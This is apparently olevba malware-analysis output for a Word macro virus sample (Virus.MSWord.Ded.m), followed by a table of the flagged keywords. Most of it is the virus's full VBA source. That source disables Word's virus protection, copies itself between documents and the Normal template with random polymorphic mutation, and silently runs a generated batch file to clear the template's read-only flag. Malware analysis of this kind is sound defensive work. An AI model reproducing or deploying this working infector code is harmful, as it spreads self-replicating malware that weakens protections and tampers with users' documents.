olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.m-1e2125c69390dc96bc146022b6086964da481989
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.m-1e2125c69390dc96bc146022b6086964da481989 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
     Private _
Sub Document_Close()

  On Error GoTo skam
'24,01388
          Options. _
VirusProtection = False

              SWL
'12,00358
       ABS99
'4,611689
skam:
'57,84001
          End _
Sub

 Private Sub _
Čäĺíňčôčęŕňîđ()

        End Sub
'19,21073
     Private Sub Document_New()
'81,87105
 End Sub
'80,53137
       Sub Claudio()
'84,76658
       On Error _
GoTo skam

     Options. _
VirusProtection = False

SWL
'96,09924
         ABS99
'38,10434
skam:
'60,13807
             End Sub
'95,08818
             Private _
Sub SWL()

      Application. _
                                     ShowVisualBasicEditor = False

 If Not _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

             For I = 1 To NormalTemplate. _
VBProject.VBComponents(1).CodeModule.CountOfLines

 d = NormalTemplate.VBProject. _
           VBComponents(1).CodeModule.Lines(I, 1)

If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

      While Mid(d, _
Len(d) - 1, 2) = " _"

         I = I + 1
'53,45006
           d _
= Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

          Wend
'61,9153
            d _
= e(d)

            ActiveDocument. _
             VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

       End _
If

              Next I
'53,62399
   ActiveDocument. _
                                                SaveAs AddToRecentFiles:=False

       End _
If

   End Sub
'61,97636
              Private Sub _
ABS99()

              If _
Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

      f (NormalTemplate.FullName)
'18,174
       For I = 1 To _
ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

     d = _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

          If Len(d) > 0 And _
Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

While Mid(d, Len(d) - 1, _
2) = " _"

            I = _
I + 1

              d _
= Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

             Wend
'43,81393
        d _
= e(d)

             NormalTemplate. _
               VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

         End If
'26,32273
        Next I
'52,36308
         NormalTemplate. _
                       Save

     End _
If

       End _
Sub

              Private _
Function e(aString) As String

     aString _
= LTrim(aString)

           aString = RTrim(aString)
'21,68937
   If aString = "Sub " & "Vc()" Then
'80,61559
       aString = "Sub " & "ViewVBCode()"
'99,9728
     Else
'66,88805
     If aString _
= "Sub " & "ViewVBCode()" Then

aString _
= "Sub " & "Vc()"

         End _
If

   End If
'37,50021
             For I = 1 _
To Len(aString) - 1

             If _
Mid(aString, I, 1) = "." Then

  If _
Not Mid(aString, I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

  If _
Not Mid(aString, I + 1, 1) = Chr$(34) Then

            e _
= Left(aString, I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

   For _
j = 1 To Int(15 * Rnd)

      e _
= " " & e

         Next _
j

Exit Function
'52,25902
End _
If

        End If
'90,59289
   Else
'97,62254
         If Mid(aString, I, 1) = " " And Int(3 _
* Rnd) = 1 And I > 1 Then

  If Not _
Mid(aString, I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

          e = _
Left(aString, I - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

         For j _
= 1 To Int(15 * Rnd)

         e = " " & _
e

        Next _
j

             Exit _
Function

        End If
'20,05503
            End If
'55,69043
   End If
'8,722788
     Next _
I

           e = aString & _
Chr$(13) & "'" & (100 * Rnd)

   Count _
= Int(15 * Rnd)

          For j = 1 _
To Count

   e _
= " " & e

            Next j
'31,15959
      End Function
'16,17793
 Private _
Sub f(fName)

If GetAttr(fName) _
And vbReadOnly Then

          Open _
Dir(fName) & ".bat" For Append As #1

  Print #1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)
'35,75141
            Print #1, "del " & Chr$(34) & _
Dir(fName) & ".bat" & Chr$(34)

   Close #1
'19,25556
 shellResult _
= Shell(Dir(fName) & ".bat", vbHide)

    End If
'15,73996
            End Sub
'77,7336
       Sub ViewVBCode()
'24,21011
         For _
aDoc = 1 To Documents.Count

              For I _
= 1 To Documents(aDoc).VBProject.VBComponents(1).CodeModule.CountOfLines

 Documents(aDoc). _
        VBProject.VBComponents(1).CodeModule.DeleteLines 1

     Next I
'49,5485
            Next aDoc
'82,55717
 For I _
= 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

     NormalTemplate. _
VBProject.VBComponents(1).CodeModule.DeleteLines 1

     Next I
'92,32065
        Application.ShowVisualBasicEditor = True
'36,26178
    End Sub
'70,12241
 Private _
Sub Document_Open()

  End _
Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

